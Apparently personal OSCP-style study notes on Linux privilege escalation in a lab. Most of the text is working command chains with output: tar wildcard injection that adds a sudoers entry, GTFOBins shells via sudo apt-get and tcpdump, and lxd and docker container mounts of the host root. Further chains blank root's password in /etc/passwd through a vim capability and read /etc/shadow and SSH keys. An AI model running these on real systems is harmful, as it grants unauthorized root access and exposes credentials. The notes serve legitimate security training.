--- 
title: "linux privilege escalation" 
weight: 33 
---
#### File Systems & Additional Drives

Introduction to Linux Privilege Escalation

```shell-session
cube111@local[/local]$ lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   30G  0 disk 
├─sda1   8:1    0   29G  0 part /
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1  848M  0 rom
```

&nbsp;

&nbsp;

#### Find Writable Directories

Introduction to Linux Privilege Escalation

```shell-session
cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

/dmz-backups
/tmp
/tmp/VMwareDnD
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/proc
/dev/mqueue
/dev/shm
/var/tmp
/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
/var/crash
/run/lock
```

&nbsp;

&nbsp;

#### Find Writable Directories

Introduction to Linux Privilege Escalation

```shell-session
cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

/dmz-backups
/tmp
/tmp/VMwareDnD
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/proc
/dev/mqueue
/dev/shm
/var/tmp
/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
/var/crash
/run/lock



find / -path /mnt -prune -o -type d -writable 2>/dev/null

```

&nbsp;

&nbsp;

&nbsp;

## Gaining Situational Awareness

&nbsp;

&nbsp;

- `whoami` - what user are we running as
- `id` - what groups does our user belong to?
- `hostname` - what is the server named, can we gather anything from the naming convention?
- `ifconfig` or `ip a` - what subnet did we land in, does the host have additional NICs in other subnets?
- `sudo -l` - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like `sudo su` and drop right into a root shell.

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ env

SHELL=/bin/bash
PWD=/home/local-student
LOGNAME=local-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/local-student
LANG=en_US.UTF-8
```

&nbsp;

&nbsp;

```shell-session
Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ lscpu 

Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   43 bits physical, 48 bits virtual
CPU(s):                          2
On-line CPU(s) list:             0,1
Thread(s) per core:              1
Core(s) per socket:              2
Socket(s):                       1
NUMA node(s):                    1
Vendor ID:                       AuthenticAMD
CPU family:                      23
Model:                           49
Model name:                      AMD EPYC 7302P 16-Core Processor
Stepping:                        0
CPU MHz:                         2994.375
BogoMIPS:                        5988.75
Hypervisor vendor:               VMware

<SNIP>
```

&nbsp;

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ cat /etc/shells

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
loop1                       7:1    0   69M  1 loop /snap/lxd/14804
loop2                       7:2    0   47M  1 loop /snap/snapd/16292
loop3                       7:3    0  103M  1 loop /snap/lxd/23339
loop4                       7:4    0   62M  1 loop /snap/core20/1587
loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
sda                         8:0    0   20G  0 disk 
├─sda1                      8:1    0    1M  0 part 
├─sda2                      8:2    0    1G  0 part /boot
└─sda3                      8:3    0   19G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ cat /etc/fstab

# /etc/fstab: static file system information.
#
# Use "blkid" to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0
# /boot was on /dev/sda2 during curtin installation
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ cat /etc/group

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,local-student
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ getent group sudo

sudo:x:27:mrb3n
```

&nbsp;

&nbsp;

#### Unmounted File Systems

Environment Enumeration

```shell-session
cube111@local[/local]$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
/swapfile                                  none       swap  sw
```

&nbsp;

&nbsp;

&nbsp;

#### All Hidden Files

Environment Enumeration

```shell-session
cube111@local[/local]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep local-student

-rw-r--r-- 1 local-student local-student 3771 Nov 27 11:16 /home/local-student/.bashrc
-rw-rw-r-- 1 local-student local-student 180 Nov 27 11:36 /home/local-student/.wget-hsts
-rw------- 1 local-student local-student 387 Nov 27 14:02 /home/local-student/.bash_history
-rw-r--r-- 1 local-student local-student 807 Nov 27 11:16 /home/local-student/.profile
-rw-r--r-- 1 local-student local-student 0 Nov 27 11:31 /home/local-student/.sudo_as_admin_successful
-rw-r--r-- 1 local-student local-student 220 Nov 27 11:16 /home/local-student/.bash_logout
-rw-rw-r-- 1 local-student local-student 162 Nov 28 13:26 /home/local-student/.notes
```

&nbsp;

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ find / -type d -name ".*" -ls 2>/dev/null

   684822      4 drwx------   3 local-student local-student     4096 Nov 28 12:32 /home/local-student/.gnupg
   790793      4 drwx------   2 local-student local-student     4096 Okt 27 11:31 /home/local-student/.ssh
   684804      4 drwx------  10 local-student local-student     4096 Okt 27 11:30 /home/local-student/.cache
   790827      4 drwxrwxr-x   8 local-student local-student     4096 Okt 27 11:32 /home/local-student/CVE-2021-3156/.git
   684796      4 drwx------  10 local-student local-student     4096 Okt 27 11:30 /home/local-student/.config
   655426      4 drwxr-xr-x   3 local-student local-student     4096 Okt 27 11:19 /home/local-student/.local
   524808      4 drwxr-xr-x   7 gdm
```

&nbsp;

&nbsp;

&nbsp;

##### Cheat Sheet

The cheat sheet is a useful command reference for this module.

| **Command** | **Description** |
| --- | --- |
| `ssh local-student@<target IP>` | SSH to lab target |
| `ps aux | grep root` | See processes running as root |
| `ps au` | See logged in users |
| `ls /home` | View user home directories |
| `ls -l ~/.ssh` | Check for SSH keys for current user |
| `history` | Check the current user's Bash history |
| `sudo -l` | Can the user run anything as another user? |
| `ls -la /etc/cron.daily` | Check for daily Cron jobs |
| `lsblk` | Check for unmounted file systems/drives |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` | Find world-writeable directories |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Find world-writeable files |
| `uname -a` | Check the Kernel versiion |
| `cat /etc/lsb-release` | Check the OS version |
| `gcc kernel_expoit.c -o kernel_expoit` | Compile an exploit written in C |
| `screen -v` | Check the installed version of `Screen` |
| `./pspy64 -pf -i 1000` | View running processes with `pspy` |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SETGID bit set |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump` |
| `echo $PATH` | Check the current user's PATH variable contents |
| `PATH=.:${PATH}` | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Search for config files |
| `ldd /bin/ls` | View the shared objects required by a binary |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart` | Escalate privileges using `LD_PRELOAD` |
| `readelf -d payroll | grep PATH` | Check the RUNPATH of a binary |
| `gcc src.c -fPIC -shared -o /development/libshared.so` | Compiled a shared libary |
| `lxd init` | Start the LXD initialization process |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` | Import a local image |
| `lxc init alpine r00t -c security.privileged=true` | Start a privileged LXD container |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` | Mount the host file system in a container |
| `lxc start r00t` | Start the container |
| `showmount -e 10.129.2.12` | Show the NFS export list |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt` | Mount an NFS share locally |
| `tmux -S /shareds new -s debugsess` | Created a shared `tmux` session socket |
| `./lynis audit system` | Perform a system audit with `Lynis` |

&nbsp;

&nbsp;

#### Installed Packages

```shell-session
[!bash!]$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

Listing...                                                 
accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          
accountsservice 0.6.55-0ubuntu12~20.04.5                   
acl 2.2.53-6                                               
acpi-support 0.143                                         
acpid 2.0.32-1ubuntu1                                      
adduser 3.118ubuntu2                                       
adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 
alsa-base 1.0.25+dfsg-0ubuntu5                             
alsa-topology-conf 1.2.2-1                                                                                            
alsa-ucm-conf 1.2.2-1ubuntu0.13                            
alsa-utils 1.2.2-1ubuntu2.1                                                                                           
amd64-microcode 3.20191218.1ubuntu1
anacron 2.3-29
```

&nbsp;

&nbsp;

&nbsp;

# Credential Hunting

```shell-session
local_student@NIX02:~$ cat wp-config.php | grep 'DB_USER|DB_PASSWORD'

define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```

The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

Credential Hunting

```shell-session
local_student@NIX02:~$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/etc/kbd/config
/etc/manpath.config
/boot/config-4.4.0-116-generic
/boot/grub/i386-pc/configfile.mod
/sys/devices/pci0000:00/0000:00:00.0/config
/sys/devices/pci0000:00/0000:00:01.0/config
<SNIP>
```

* * *

## SSH Keys

It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the `known_hosts` file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.

Credential Hunting

```shell-session
local_student@NIX02:~$  ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts
```

&nbsp;

&nbsp;

&nbsp;

# Path Abuse

&nbsp;

```shell-session
local_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Path Abuse

```shell-session
local_student@NIX02:~$ PATH=.:${PATH}
local_student@NIX02:~$ export PATH
local_student@NIX02:~$ echo $PATH
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Wildcard Abuse

&nbsp;

Consider the following cron job, which is set up to back up the `/home/local-student` directory's contents and create a compressed archive within `/home/local-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

Wildcard Abuse

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/local-student && tar -zcf /home/local-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

Wildcard Abuse

```shell-session
local-student@NIX02:~$ echo 'echo "local-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
local-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
local-student@NIX02:~$ echo "" > --checkpoint=1
```

&nbsp;

&nbsp;

&nbsp;

# Escaping Restricted Shells

&nbsp;

### 2️⃣ **Command Substitution**

```shell-session
cube111@local[/local]$ ls -l `pwd`
```

&nbsp;

&nbsp;

### 3️⃣ **Command Chaining**

Use shell metacharacters to chain commands:

bash

CopyEdit

`ls -l ; id`

- The semicolon `;` allows execution of `id` after `ls`.

Other chaining operators:

| Operator | Meaning |
| --- | --- |
| `;` | Run multiple commands sequentially |
| `&&` | Run second command only if first succeeds |
| ` ` |     |
| ` ` | ` ` |

* * *

### 4️⃣ **Environment Variables Abuse**

&nbsp;

### 4️⃣ **Environment Variables Abuse**

Modify environment variables to bypass restrictions.

Example: If the restricted shell uses a specific PATH:

bash

CopyEdit

`PATH=/your/path:$PATHexport PATH`

- Insert malicious binaries or scripts earlier in PATH.

* * *

### 5️⃣ **Shell Functions**

Define functions that wrap restricted commands with additional commands.

Example:

bash

CopyEdit

`function ls() { /bin/ls; /bin/bash; }`

- Calling `ls` triggers both `ls` and spawns an unrestricted shell.

* * *

## Summary

✅ Always test:

- Command injection (`$( )`, backticks)
    
- Chaining (`;`, `&&`, `||`)
    
- Environment variable manipulation
    
- Shell function redefinitions
    

✅ Restricted shells are often poorly implemented and easy to bypass with creativity.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# 📌 Linux Special Permissions: `setuid`, `setgid`, and GTFOBins

* * *

## 🔍 Concept Explanation

### **Set User ID (setuid)**

- Allows a user to execute a file with the **file owner's privileges**.
    
- Typically used to temporarily grant **root privileges** for certain binaries.
    
- When set, the file permissions show `s` for the owner execute bit (`rws`).
    
- Exploitable if:
    
    - The binary has unintended features.
        
    - The binary can be abused to execute arbitrary code.
        

### **Set Group ID (setgid)**

- Similar to `setuid`, but applies to **group ownership**.
    
- Executes the file as if you are part of the group that owns the file.
    
- Permissions show `s` for the group execute bit (`rwsr-sr-x`).
    

* * *

## 💻 SUID Enumeration Commands

bash

CopyEdit

`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`

> find / -perm -u=s -type f 2>/dev/null

**Syntax Explanation:**

- `/` : Search entire filesystem.
    
- `-user root` : Owned by root.
    
- `-perm -4000` : Files with SUID set.
    
- `-exec ls -ldb {} \;` : List full details of found files.
    
- `2>/dev/null` : Suppress permission denied errors.
    

### 🔬 Example Output

swift

CopyEdit

`-rwsr-xr-x 1 root root 16728 /home/local-student/shared_obj_hijack/payroll-rwsr-xr-x 1 root root 40152 /bin/mount-rwsr-xr-x 1 root root 54256 /usr/bin/passwd...`

* * *

## 💻 SGID Enumeration Commands

bash

CopyEdit

`find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`

**Syntax Explanation:**

- `-perm -6000` : Search for both setuid (4000) and setgid (2000) files together.
    
- Rest is same as above.
    

### 🔬 Example Output

swift

CopyEdit

`-rwsr-sr-x 1 root root 85832 /usr/lib/snapd/snap-confine`

* * *

## 🛡 Privilege Escalation via SUID/SGID

- Reverse engineer custom binaries (e.g., `payroll`, `netracer`) for vulnerabilities.
    
- Many default system binaries are safe (e.g., `passwd`, `su`), but check for version-specific exploits.
    
- Combine with **GTFOBins** to check for abuse opportunities.
    

* * *

## 📌 GTFOBins

- Curated database of Linux binaries that can be exploited for:
    
    - Privilege Escalation
        
    - Restricted shell escape
        
    - Reverse shells
        
    - File transfers
        

**Website:**  
https://gtfobins.github.io

* * *

## 💻 GTFOBins Sudo Example (`apt-get`)

bash

CopyEdit

`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`

**Syntax Explanation:**

- `sudo` : Run as root.
    
- `apt-get update` : Executes update.
    
- `-o APT::Update::Pre-Invoke::=/bin/sh` : Before running update, execute `/bin/sh` as root.
    

### 🔬 Output Example

bash

CopyEdit

`# iduid=0(root) gid=0(root) groups=0(root)`

* * *

## ⚠ Notes

- Always manually review unusual SUID/SGID binaries.
    
- GTFOBins is extremely helpful for live exam scenarios.
    
- Memorize common binaries: `vim`, `less`, `nano`, `awk`, `perl`, `python`, `tar`, `find`, `cp`, `rsync`, etc.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Sudo Rights Abuse

&nbsp;

```shell-session
local_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

&nbsp;

&nbsp;

```shell-session
local_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

&nbsp;

![4d00853b5c12c0909b93db54c5e683f5.png](/resources/4d00853b5c12c0909b93db54c5e683f5.png)

&nbsp;

&nbsp;

&nbsp;

# 📌 Privileged Groups Exploitation (OSCP)

* * *

## 🔍 Concept Explanation

- Certain Linux groups grant indirect root-like privileges.
    
- If user is a member of these groups, they may escalate privileges using group-specific capabilities.
    
- Always check group memberships using:
    

bash

CopyEdit

`id`

Example:

bash

CopyEdit

`devops@NIX02:~$ iduid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)`

* * *

## 🔧 Group: `lxd` (Linux Containers)

### 🔍 Why dangerous

- `lxd` allows managing containers.
    
- Member can create **privileged containers** which map container root → host root.
    

* * *

### 💻 Exploitation Steps

#### 1️⃣ Extract the LXD image:

bash

CopyEdit

`unzip alpine.zipcd 64-bit\ Alpine/`

#### 2️⃣ Initialize LXD (use defaults):

bash

CopyEdit

`lxd init`

Example answers:

- Storage backend: dir
    
- Network: no
    
- LXD bridge: yes
    

#### 3️⃣ Import image:

bash

CopyEdit

`lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`

#### 4️⃣ Create privileged container:

bash

CopyEdit

`lxc init alpine r00t -c security.privileged=true`

#### 5️⃣ Mount host file system inside container:

bash

CopyEdit

`lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`

#### 6️⃣ Start container:

bash

CopyEdit

`lxc start r00t`

#### 7️⃣ Spawn shell inside container:

bash

CopyEdit

`lxc exec r00t /bin/sh`

#### 8️⃣ Verify root access:

bash

CopyEdit

`iduid=0(root) gid=0(root)`

#### 🔍 Example: access host root file system:

bash

CopyEdit

`cd /mnt/root/rootcat /mnt/root/etc/shadow`

* * *

## 🔧 Group: `docker`

### 🔍 Why dangerous

- Full filesystem access via container volumes.
    
- Docker containers can mount host directories, exposing root files.
    

### 💻 Exploitation Example

bash

CopyEdit

`docker run -v /root:/mnt -it ubuntu /bin/bash`

#### Explanation:

- `-v /root:/mnt` → Mount host `/root` dir inside container.
    
- Inside container:
    

bash

CopyEdit

`cd /mntcat .ssh/authorized_keys`

- Same technique can be used to access `/etc/shadow` for password hashes.

* * *

## 🔧 Group: `disk`

### 🔍 Why dangerous

- Full access to block devices under `/dev` (e.g. `/dev/sda1`).
    
- Entire file system can be read directly.
    

### 💻 Exploitation Example (using debugfs):

bash

CopyEdit

`sudo debugfs /dev/sda1`

#### Inside debugfs:

bash

CopyEdit

`lscd /rootcat .ssh/authorized_keys`

- Can retrieve sensitive files or add SSH keys.

* * *

## 🔧 Group: `adm`

### 🔍 Why dangerous

- Can read system logs in `/var/log`.
    
- Can expose:
    
    - Credentials accidentally logged.
        
    - Running cron jobs.
        
    - Command history.
        
    - Application errors with sensitive data.
        

### 💻 Exploitation Example

bash

CopyEdit

`cd /var/logcat auth.logcat mysql/error.logcat cron.log`

* * *

## 🔐 Key OSCP Takeaway

## Always check group memberships — `lxd`, `docker`, `disk`, and `adm` may allow privilege escalation even without full sudo access.

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# 📌 Linux Capabilities Exploitation (OSCP)

* * * 

## 🔍 Concept Explanation

- Linux capabilities break the all-or-nothing root privilege model.
    
- Capabilities allow assigning specific privileges to binaries.
    
- Binaries can perform restricted actions without full root permissions.
    
- If misused, capabilities can lead to privilege escalation.
    

* * *

## 🔧 Setting Capabilities

### Command

bash

CopyEdit

`sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic`

### Syntax Explanation

| Part | Meaning |
| --- | --- |
| `setcap` | set capabilities |
| `cap_net_bind_service` | capability name |
| `+ep` | effective & permitted privileges |
| `/usr/bin/vim.basic` | target binary |

* * *

## 🔧 Common Dangerous Capabilities

| Capability | Description |
| --- | --- |
| `cap_sys_admin` | Broad admin privileges (almost full root) |
| `cap_sys_chroot` | Change root directory |
| `cap_sys_ptrace` | Debug and attach to other processes |
| `cap_sys_nice` | Change process priority |
| `cap_sys_time` | Modify system clock |
| `cap_sys_resource` | Modify system resource limits |
| `cap_sys_module` | Load/unload kernel modules |
| `cap_net_bind_service` | Bind to low TCP ports |
| `cap_setuid` | Change effective user ID |
| `cap_setgid` | Change effective group ID |
| `cap_dac_override` | Bypass file permission checks |

* * *

## 🔧 Capability Values

| Value | Description |
| --- | --- |
| `=` | Clear capability |
| `+ep` | Effective & Permitted privileges |
| `+ei` | Effective & Inheritable privileges |
| `+p` | Permitted only |

* * *

## 🔧 Enumerating Capabilities

### Search capabilities across common bin dirs:

bash

CopyEdit

`find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;`

secaudit@NIX02:~$ getcap / -r 2>/dev/null  
/usr/bin/mtr-packet = cap_net_raw+ep  
secaudit@NIX02:~$ 

### Output Example:

bash

CopyEdit

`/usr/bin/vim.basic cap_dac_override=eip/usr/bin/ping cap_net_raw=ep/usr/bin/mtr-packet cap_net_raw=ep`

* * *

## 🔧 Exploiting `cap_dac_override`

- `cap_dac_override` allows bypassing file read/write permission checks.

### 1️⃣ Confirm capability on vulnerable binary:

bash

CopyEdit

`getcap /usr/bin/vim.basic`

Output:

bash

CopyEdit

`/usr/bin/vim.basic cap_dac_override=eip`

* * *

### 2️⃣ Modify `/etc/passwd` using vim.basic:

bash

CopyEdit

`/usr/bin/vim.basic /etc/passwd`

- You now have write access to `/etc/passwd` without being root.

* * * 

### 3️⃣ Modify root account to remove password:

bash

CopyEdit

`echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`

**Explanation:**

- Replace password hash field with empty (`root::`).
    
- `-es` → non-interactive mode.
    

* * *

### 4️⃣ Verify:

bash

CopyEdit

`cat /etc/passwd | head -n1`

Expected output:

ruby

CopyEdit

`root::0:0:root:/root:/bin/bash`

* * *

### 5️⃣ Switch to root with no password:

bash

CopyEdit

`su -`

* * *

## 🛡 OSCP Pro Tip

> **Any capability that allows writing files, changing EUID, or bypassing permission checks is extremely dangerous and should be reviewed immediately when found.**
> 
> &nbsp;
> 
> &nbsp;
> 
> &nbsp;
> 
> &nbsp;
> 
> &nbsp;
> 
> &nbsp;
> 
> # 📌 Cron Job Abuse (OSCP Privilege Escalation)
> 
> * * *
> 
> ## 🔍 Concept
> 
> - **Cron jobs** run scheduled tasks automatically.
>     
> - Misconfigured cron jobs may allow low-privileged users to escalate privileges if:
>     
>     - They can modify scripts run by cron.
>         
>     - The cron job runs as root.
>         
>     - The modified scripts contain injected payloads.
>         
> 
> * * *
> 
> ## 🔧 Crontab Syntax (OSCP quick rule)
> 
> | Field | Meaning |
> | --- | --- |
> | Minute | 0–59 |
> | Hour | 0–23 |
> | Day of month | 1–31 |
> | Month | 1–12 |
> | Day of week | 0–7 |
> | Command | The command to run |
> 
> ✅ Example:
> 
> bash
> 
> CopyEdit
> 
> `0 */12 * * * /home/admin/backup.sh`
> 
> > Runs every 12 hours.
> 
> ✅ Misconfigured Example:
> 
> bash
> 
> CopyEdit
> 
> `*/3 * * * * /home/admin/backup.sh`
> 
> > Runs every 3 minutes.
> 
> * * *
> 
> ## 🔧 Finding Cron Jobs to Abuse
> 
> ### 1️⃣ Search for world-writable files (potential targets):
> 
> bash
> 
> CopyEdit
> 
> `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
> 
> ✅ Output example:
> 
> bash
> 
> CopyEdit
> 
> `/etc/cron.daily/backup/dmz-backups/backup.sh/home/backupsvc/backup.sh`
> 
> * * *
> 
> ### 2️⃣ Observe file timestamps
> 
> - Notice backup files being created every few minutes:
> 
> bash
> 
> CopyEdit
> 
> `ls -la /dmz-backups/`
> 
> ✅ Example:
> 
> makefile
> 
> CopyEdit
> 
> `www-backup-2020831-02:24:01.tgzwww-backup-2020831-02:27:01.tgz...`
> 
> - This suggests the cron job runs frequently (every 3 minutes).
> 
> * * *
> 
> ### 3️⃣ Monitor real-time cron activity using `pspy`
> 
> bash
> 
> CopyEdit
> 
> `./pspy64 -pf -i 1000`

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# 📌 LXD / LXC Privilege Escalation (Containers)

* * *

## 🔍 What are containers?

| Containers | Virtual Machines |
| --- | --- |
| Share same kernel | Full separate kernel |
| Lightweight | Heavy |
| Process-level isolation | Full hardware-level isolation |
| Easy to abuse if misconfigured | Harder to abuse |

✅ Containers = isolated environment running inside host OS kernel.

* * *

# 📌 Why is this a privilege escalation vector?

- If you're part of the `lxd` or `lxc` group:
    
    - You can control container instances.
        
    - Containers can mount host file systems.
        
    - Misconfigured containers allow full root access to the host.
        

✅ This is **post-exploitation gold** if you land inside any user with LXD rights.

* * *

# 📌 Check group membership

bash

CopyEdit

`id`

✅ If you see `lxd` or `lxc` group, you're likely exploitable:

sql

CopyEdit

`uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)`

* * *

# 📌 The attack chain

* * *

### 1️⃣ Find existing container templates:

bash

CopyEdit

`ls`

✅ Example:

cpp

CopyEdit

`ubuntu-template.tar.xz`

* * *

### 2️⃣ Import image:

bash

CopyEdit

`lxc image import ubuntu-template.tar.xz --alias ubuntutemp`

* * *

### 3️⃣ Verify image import:

bash

CopyEdit

`lxc image list`

* * *

### 4️⃣ Initialize privileged container

✅ Critical part: disable isolation

bash

CopyEdit

`lxc init ubuntutemp privesc -c security.privileged=true`

- This allows container to fully access host kernel features.

* * *

### 5️⃣ Mount host root filesystem inside container

bash

CopyEdit

`lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`

✅ This mounts host’s `/` directory inside the container at `/mnt/root/`.

* * *

### 6️⃣ Start container

bash

CopyEdit

`lxc start privesc`

* * *

### 7️⃣ Get shell inside container

bash

CopyEdit

`lxc exec privesc /bin/bash`

✅ You are now root *inside container* with access to mounted host filesystem.

* * *

### 8️⃣ Access host filesystem as root

bash

CopyEdit

`cd /mnt/rootls -la`

✅ You can now modify host files, edit `/etc/passwd`, add users, drop SSH keys — full root.

* * *

# 📌 OSCP One-Liner Summary for Joplin:

> LXD/LXC allows privileged containers to mount host filesystem. If you're in `lxd` group, you can escalate to host root by creating a privileged container, mounting `/` and modifying host system directly.

* * *

# 📌 Full One-Shot Attack Flow (for your Joplin):

bash

CopyEdit

`# Check for lxd group membershipid# Import existing template imagelxc image import ubuntu-template.tar.xz --alias ubuntutemp# Initialize privileged containerlxc init ubuntutemp privesc -c security.privileged=true# Mount host filesystemlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true# Start containerlxc start privesc# Enter container shelllxc exec privesc /bin/bash# Access host filesystemcd /mnt/root`

&nbsp;

&nbsp;

```bash
id  
lxc image import ubuntu-template.tar.xz --alias ubuntutemp  
lxc init ubuntutemp privesc -c security.privileged=true  
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true  
lxc start privesc  
lxc exec privesc -- /bin/bash  
cd /mnt/root
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Docker
